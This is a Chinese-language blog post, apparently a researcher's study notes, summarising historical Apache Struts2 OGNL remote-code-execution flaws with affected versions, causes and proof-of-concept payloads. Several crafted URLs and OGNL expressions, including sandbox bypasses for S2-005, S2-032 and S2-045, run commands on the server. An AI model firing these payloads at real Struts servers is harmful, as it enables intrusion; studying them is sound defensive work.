@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="He1m4n6a的博客">
+    <meta name="keyword"  content="腾讯">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Struts2历史漏洞总结 - He1m4n6a的博客 | He1m4n6a&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>He1m4n6a</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#strust2漏洞简要分析"><span class="toc-text">strust2漏洞简要分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-001"><span class="toc-text">S2-001</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-003"><span class="toc-text">S2-003</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-005"><span class="toc-text">S2-005</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-007"><span class="toc-text">S2-007</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-009"><span class="toc-text">S2-009</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-012"><span class="toc-text">S2-012</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-013"><span class="toc-text">S2-013</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-015"><span class="toc-text">S2-015</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-016"><span class="toc-text">S2-016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-029"><span class="toc-text">S2-029</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-032"><span class="toc-text">S2-032</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-032-1"><span class="toc-text">S2-032</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-045"><span class="toc-text">S2-045</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-046"><span class="toc-text">S2-046</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-048"><span class="toc-text">S2-048</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-053"><span class="toc-text">S2-053</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞总结"><span class="toc-text">漏洞总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#strust2漏洞调试"><span class="toc-text">strust2漏洞调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-001漏洞调试"><span class="toc-text">Struts2 001漏洞调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Strust2-003漏洞调试"><span class="toc-text">Strust2 003漏洞调试</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Struts2历史漏洞总结
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-03-20 23:56:24</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#Strusts2" title="Strusts2">Strusts2</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#Ongl" title="Ongl">Ongl</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文章不分析各个漏洞的具体原理了，这篇文章<a href="https://www.freebuf.com/vuls/217482.html已经归纳了struts2历史漏洞的分析。大部分漏洞都是因为执行了ongl表达式造成的，关于ognl前一篇文章也做了详细的介绍。我就做简单的归纳，以及选代表漏洞做具体的调试过程。" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html已经归纳了struts2历史漏洞的分析。大部分漏洞都是因为执行了ongl表达式造成的，关于ognl前一篇文章也做了详细的介绍。我就做简单的归纳，以及选代表漏洞做具体的调试过程。</a></p>
+<h1 id="strust2漏洞简要分析"><a href="#strust2漏洞简要分析" class="headerlink" title="strust2漏洞简要分析"></a>strust2漏洞简要分析</h1><h2 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h2><p><strong>适用版本：</strong>2.0.0 – 2.0.8</p>
+<p><strong>POC:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">%&#123;<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">"open /Applications/Calculator.app/"</span>)&#125;</span></pre></td></tr></table></figure>
+
+<p><strong>简单原理：</strong></p>
+<p>没有任何过滤。struts2用来处理传入参数以及request中各项参数的值栈OgnlValueStack在进行取值的时候，就会去调用ognl的getValue参数，从而造成命令执行。</p>
+<h2 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h2><p><strong>适用版本：</strong>2.0.0 – 2.1.8.1</p>
+<p><strong>POC：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.glassy.com/test.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&amp;('\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/Applications/Notes.app/\')')(a)(b)</span></span></pre></td></tr></table></figure>
+
+<p><strong>简单原理</strong>：</p>
+<p>Ognl.setValue同意具有执行java代码的能力，S2-003就是利用了<strong>Ognl.setValue</strong>的执行java代码的能力造成的RCE。需要构造ASTEval语法树：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">OgnlContext context = <span class="keyword">new</span> OgnlContext();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Ognl.setValue(<span class="string">"(\"@java.lang.Runtime@getRuntime().exec(\'open /Applications/Calculator.app/\')\")(glassy)(amadeus)"</span>,context,<span class="string">""</span>);</span></pre></td></tr></table></figure>
+
+<h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><p><strong>适用版本：</strong>2.0.0 – 2.1.8.1</p>
+<p><strong>POC:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.glassy.com/test.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(a)(b)&amp;('\u0023_memberAccess.allowStaticMethodAccess\u003dfalse')(a)(b)&amp;('\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/Applications/Notes.app/\')')(a)(b)</span></span></pre></td></tr></table></figure>
+
+<p><strong>简单原理：</strong></p>
+<p>S2-005就是对于S2-003的绕过，从上面的修复可以看到，补丁的关键部分在于通过对<strong>securityMemberAccess的两个成员变量allowStaticMethodAccess和excludeProperties对OGNL表达式能否加载函数</strong>，然而通过OGNL表达式，我们可以改写这两个变量的值（和denyMethodExecution是一个套路），来实现补丁的绕过。</p>
+<h2 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h2><p><strong>适用版本：</strong>2.0.0 – 2.2.3</p>
+<p>提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成OGNL表达式的执行，具体是由ConversionErrorInterceptor拦截器触发的。</p>
+<h2 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h2><p><strong>适用版本：</strong>2.0.0 – 2.3.1.1</p>
+<p>S2-009其实就是对003和005的绕过。</p>
+<p><strong>简单原理：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">OgnlContext context = <span class="keyword">new</span> OgnlContext();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Ognl.setValue(<span class="string">"password"</span>,context,<span class="string">"@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/')(glassy)"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Ognl.setValue(<span class="string">"a[(password)(glassy)]"</span>,context,<span class="string">"true"</span>);</span></pre></td></tr></table></figure>
+
+<p>第一行代码用于将password-payload的map写入ognl的root中去，第二行代码中的a[(password)(glassy)]在AST树中进行解析的时候按照从右到左，从里到外的顺序进行解析，因此优先解析(password)(glassy),password的值在root中有（password-payload），于是解析成了payload(glassy)的形式，然后就是和ST2-003一样的原理造成了RCE了。</p>
+<h2 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h2><p><strong>适用版本：</strong>Struts Showcase 2.0.0 – Struts Showcase 2.3.14.2</p>
+<p><strong>POC:</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"/bin/bash", "-c", "open /Applications/Notes.app/"&#125;)).start()&#125;</span></pre></td></tr></table></figure>
+
+<p><strong>简单原理：</strong></p>
+<p>造成这个RCE的问题出在了重定向上，当需要从ST2的值栈中读取数据作为重定向的参数，而这个值又是前端可控的情况下可以造成RCE。注意：</p>
+<p>这次的poc没有使用Runtime类而改用了ProcessBuilder类，这个类有一个优势，<strong>它不是静态类，命令执行的时候调用的start方法也不是静态方法，不受OgnlValueStack类的allowStaticMethodAccess值的限制。</strong></p>
+<h2 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h2><p><strong>适用版本：</strong>2.0.0 – 2.3.14.1</p>
+<p><strong>简单原理：</strong></p>
+<p>jsp通过s:url或s:a标签来动态生成跳转的action的时候，如果想把jsp里面的参数带到action的后面，就需要配置includeParams，这样的话服务端就会先去拿到jsp的参数，并带到ST2的ognl里面计算一下这个参数再去拼接到action后面，从而造成了rce。</p>
+<h2 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h2><p><strong>适用版本：</strong>2.0.0 – 2.3.14.2</p>
+<p>使用通配符*来做action映射的时候会导致问题。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">class</span>=<span class="string">"example.ExampleSupport"</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">result</span>&gt;</span>/example/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span></pre></td></tr></table></figure>
+
+<p>ST2处理通配符配置的action映射的时候流程是这样的：如果一个请求的action在映射中不存在，那么就会去匹配通配符，ST2会根据请求的action名来加载对应的jsp文件。以上面的配置为例子，当请求一个struts.xml中不存在的test.action的时候，ST2就会去吧/example/test.jsp的内容返回给前端。</p>
+<h2 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h2><p><strong>适用版本：</strong>2.0.0 – 2.3.15</p>
+<p><strong>POC:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.glassy.com/Struts2Demo_war_exploded/hello.action?redirect:%24%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%27%2fbin%2fbash%27%2c+%27-c%27%2c%27open+%2fApplications%2fNotes.app%2f%27%7d)).start()%7d</span></span></pre></td></tr></table></figure>
+
+<p><strong>简单原理：</strong></p>
+<p>ST2使用action:或redirect:\redirectAction:作为前缀参数来进行短路导航状态变化，后面的语句会直接进行ognl表达式计算。</p>
+<p>##S2-019</p>
+<p><strong>适用版本：</strong>2.0.0 – 2.3.15.1</p>
+<p><strong>POC:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.glassy.com/Struts2Demo_war_exploded/hello.action?debug=command&amp;expression=%23a%3d(new+java.lang.ProcessBuilder(%27open+%2fApplications%2fNotes.app%2f%27)).start()</span></span></pre></td></tr></table></figure>
+
+<p><strong>简单原理：</strong></p>
+<p>当struts2开启求开发者模式时候，可以直接远程通过debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中。</p>
+<h2 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h2><p><strong>适用版本：</strong>2.0.0 – 2.3.24.1 (不包括2.3.20.3)</p>
+<h2 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h2><p><strong>适用版本：2.3.20 – 2.3.28</strong>（2.3.20.3和2.3.24.3除外）</p>
+<h2 id="S2-032-1"><a href="#S2-032-1" class="headerlink" title="S2-032"></a>S2-032</h2><p><strong>适用版本：2.3.20 – 2.3.28（2.3.20.3和2.3.24.3除外）</strong></p>
+<p><strong>POC</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.glassy.com/struts2-showcase/home11.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D),d&amp;cmd=/Applications/Notes.app/Contents/MacOS/Notes</span></span></pre></td></tr></table></figure>
+
+<p><strong>简单原理：</strong></p>
+<p>这个版本漏洞要求在struts.xml中将DynamicMethodInvocation设置为true才能利用成功。（低版本ST2的DynamicMethodInvocation默认为true，高版本默认为false）</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">constant</span> <span class="type">name</span>="struts.enable.DynamicMethodInvocation" <span class="keyword">value</span>="true" /&gt;</span></pre></td></tr></table></figure>
+
+<p>当所有的interceptors调用完成后，计算返回码的时候，ST2就开始去计算我们最初传过来的method：后面的值，从而把内容放进了ognl.getValue，造成了RCE。</p>
+<h2 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h2><p><strong>适用版本：</strong>2.3.5 – 2.3.31, 2.5 – 2.5.10</p>
+<p><strong>POC:</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Content-Type:%&#123;(#glassy='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())&#125;</span></pre></td></tr></table></figure>
+
+<p><strong>简单原理：</strong></p>
+<p>ST2收到的request包包含Content-Type，并且Content-Type中包含“multipart/form-data”的时候会把请求交给MultiPartRequestWrapper处理，经过几个函数后，报错的信息被传入了TextParseUtil.translateVariables，translateVariables会在后续的调用中将报错信息中用%{}包裹的内容带入ognl.getValue。</p>
+<h2 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h2><p>同s2-045</p>
+<h2 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h2><p><strong>适用版本：</strong>使用了Struts 1 plugin 和Struts 1 action 的2.3.x 版本</p>
+<p>得使用到struts1，条件苛刻，不具体分析，有兴趣看freebuf的详细分析</p>
+<h2 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h2><p><strong>适用版本：</strong>2.0.0 – 2.3.33 , 2.5 – 2.5.10.1</p>
+<p><strong>POC：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.glassy.com/Struts2Demo_war_exploded/s2053.action?name=%25%7b(%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23a%3d(new+java.lang.ProcessBuilder(%27%2fApplications%2fNotes.app%2fContents%2fMacOS%2fNotes%27)).start())%7d</span></span></pre></td></tr></table></figure>
+
+<p><strong>简单原理：</strong></p>
+<p>053版本的利用条件也比较苛刻，只有服务端将用户可控的参数放到了Freemarker的标签属性中的时候，才会造成RCE，实例写法如下，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;<span class="meta">@s</span>.url value=<span class="string">"$&#123;name&#125;"</span>/&gt;</span></pre></td></tr></table></figure>
+
+<p>当name参数是客户端传过来的时候，就会在ST2服务器上造成RCE。st2看到返回的页面是Freemarker模板的，所以交给FreemarkerResult类处理，Freemarker在处理的时候需要去找name的值以便生成完整的标签，于是通过ST2去findString，发现name参数是ognl表达式，于是交给了ognl.getValue，造成了rce。</p>
+<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><table>
+<thead>
+<tr>
+<th align="left">漏洞名称</th>
+<th align="left">命令注入位置</th>
+<th align="left">OGNL执行函数</th>
+<th align="left">漏洞成因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">S2-001</td>
+<td align="left">参数值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">当参数值是形如%{*}的形式的时候，ST2会把这个值当做OGNL表达式去执行。</td>
+</tr>
+<tr>
+<td align="left">S2-003</td>
+<td align="left">参数名</td>
+<td align="left">Ognl.setValue</td>
+<td align="left">通过构造形如(exp)(a)(b)的形式的表达式，放入ognl.setvalue，最终会将exp带入ognl.getvalue</td>
+</tr>
+<tr>
+<td align="left">S2-005</td>
+<td align="left">参数名</td>
+<td align="left">Ognl.setValue</td>
+<td align="left">S2-003的绕过，通过ognl表达式，可以对ognl的root、context中的值做任意修改，从而绕过基于定义变量值的补丁</td>
+</tr>
+<tr>
+<td align="left">S2-007</td>
+<td align="left">参数值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">当对参数做了类型限制，而类型转换出错的时候，ST2会把出错的参数值带入Ognl.getValue</td>
+</tr>
+<tr>
+<td align="left">S2-009</td>
+<td align="left">参数值和参数名的配合</td>
+<td align="left">Ognl.setValue</td>
+<td align="left">003和005的绕过通过构造一个带有payload的值a传给ognl，再通过把(b)(a)带如ognl.setvalue从而造成和005一样的rce</td>
+</tr>
+<tr>
+<td align="left">S2-012</td>
+<td align="left">重定向参数</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">计算重定向url的时候会把重定向参数的值放入ognl.getvalue中</td>
+</tr>
+<tr>
+<td align="left">S2-013</td>
+<td align="left">使用特殊s:url或者s:a标签的action的参数值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">计算标签中action路径的时候，会把参数值带入ognl.getvalue</td>
+</tr>
+<tr>
+<td align="left">S2-015</td>
+<td align="left">action值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">计算重定向url的时候会把action的值放入ognl.getvalue中</td>
+</tr>
+<tr>
+<td align="left">S2-016</td>
+<td align="left">action:或redirect:\redirectAction:后面的值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">同012</td>
+</tr>
+<tr>
+<td align="left">S2-019</td>
+<td align="left">debug和expression的参数值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">ST2开启调试模式的时候，自带的可以执行ognl表达式的功能</td>
+</tr>
+<tr>
+<td align="left">S2-029</td>
+<td align="left">写入jsp中st2标签特殊属性值中的参数值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">返回给前端的jsp中的st2标签的属性值是形如%{exp}的形式的时候，会把exp放入ognl.getvalue</td>
+</tr>
+<tr>
+<td align="left">S2-032</td>
+<td align="left">method:后的参数值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">计算返回结果的时候，ST2就开始去计传过来的method：后面的值，从而把内容放进了ognl.getValue</td>
+</tr>
+<tr>
+<td align="left">S2-045</td>
+<td align="left">Content-Type的值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">ST2在处理上传文件出错的时候且错误信息中带%{exp}的时候，会把exp带入ognl.getValue</td>
+</tr>
+<tr>
+<td align="left">S2-048</td>
+<td align="left">传入ActionMessage的key中的参数值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">ST2处理ST1的action的时候会把ActionMessage的key传给ognl.getValue</td>
+</tr>
+<tr>
+<td align="left">S2-053</td>
+<td align="left">Freemarker的标签属性中的参数值</td>
+<td align="left">Ognl.getValue</td>
+<td align="left">计算Freemarker的标签属性值的时候会参数的值放入ognl.getvalue中</td>
+</tr>
+</tbody></table>
+<h1 id="strust2漏洞调试"><a href="#strust2漏洞调试" class="headerlink" title="strust2漏洞调试"></a>strust2漏洞调试</h1><p><a href="https://github.com/proudwind/struts2_vulns这个地址是struts2漏洞调试环境。" target="_blank" rel="noopener">https://github.com/proudwind/struts2_vulns这个地址是struts2漏洞调试环境。</a></p>
+<p>需要注意都是部署环境的时候，你要测试哪个漏洞就要修改pom.xml的struts2-core版本为相应漏洞的版本，另外struts2的filter-class也需要做相应的修改。</p>
+<h2 id="Struts2-001漏洞调试"><a href="#Struts2-001漏洞调试" class="headerlink" title="Struts2 001漏洞调试"></a>Struts2 001漏洞调试</h2><p>先放着，后面补</p>
+<h2 id="Strust2-003漏洞调试"><a href="#Strust2-003漏洞调试" class="headerlink" title="Strust2 003漏洞调试"></a>Strust2 003漏洞调试</h2><p>先放着，后面补</p>
+<p><strong>参考：</strong></p>
+<p><a href="https://seaii-blog.com/index.php/2019/12/29/90.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2019/12/29/90.html</a></p>
+<p><a href="https://www.freebuf.com/vuls/217482.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html</a></p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/donate.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://github.com/he1m4n6a" target="_blank" rel="noopener">github</a></span>
+        <span>/</span>
+        
+        <span><a href="https://weibo.com/u/1736968374" target="_blank" rel="noopener">weibo</a></span>
+        <span>/</span>
+        
+        <span><a href="#">wechat</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud" target="_blank" rel="noopener">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    <script>
+        /**
+         *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+         *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        if( '' || '')
+        var disqus_config = function () {
+            this.page.url = '';  // Replace PAGE_URL with your page's canonical URL variable
+            this.page.identifier = ''; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://airclouds-blog.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+
+</html>
